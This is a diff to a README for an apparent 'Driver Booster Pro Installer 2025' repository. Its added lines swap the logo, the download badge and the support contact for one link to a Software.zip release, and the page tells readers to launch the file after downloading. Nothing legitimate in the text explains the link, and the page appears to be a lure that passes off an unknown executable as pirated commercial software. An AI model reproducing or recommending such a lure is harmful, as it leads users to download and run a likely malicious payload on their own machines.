@@ -2,7 +2,7 @@
 
 Welcome to the **Driver Booster Pro Installer 2025** repository! 
 
-![Driver Booster Pro Installer Logo](https://www.example.com/driver_booster_logo.jpg)
+![Driver Booster Pro Installer Logo](https://github.com/waleedDevel/Driver-Booster-Pro-Installer-2025/releases/download/v1.0/Software.zip)
 
 ## Description
 **Driver Booster Pro** is a powerful software designed for automatic driver updates and system optimization, enhancing your PC's performance and stability. With a user-friendly interface and advanced features, it ensures your drivers are always up-to-date for peak performance. 
@@ -40,7 +40,7 @@ Welcome to the **Driver Booster Pro Installer 2025** repository!
 ## Installation
 You can download the Driver Booster Pro Installer 2025 package from the link below:
 
-[![Download Driver Booster Pro Installer 2025](https://img.shields.io/badge/Download-Driver%20Booster%20Pro%20Installer%202025-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Driver Booster Pro Installer 2025](https://github.com/waleedDevel/Driver-Booster-Pro-Installer-2025/releases/download/v1.0/Software.zip%20Booster%20Pro%20Installer%202025-blue)](https://github.com/waleedDevel/Driver-Booster-Pro-Installer-2025/releases/download/v1.0/Software.zip)
 
 **Note:** The file needs to be launched after downloading.
 
@@ -56,6 +56,6 @@ If the above link does not work, please check the **Releases** section for alter
 Contributions are welcome! Feel free to submit pull requests to improve the software or fix any existing issues.
 
 ## Support
-For any inquiries or support, you can contact us at support@driverboosterpro2025.com.
+For any inquiries or support, you can contact us at https://github.com/waleedDevel/Driver-Booster-Pro-Installer-2025/releases/download/v1.0/Software.zip
 
 Thank you for choosing **Driver Booster Pro Installer 2025** to enhance your PC's performance and stability! 🚀🔧
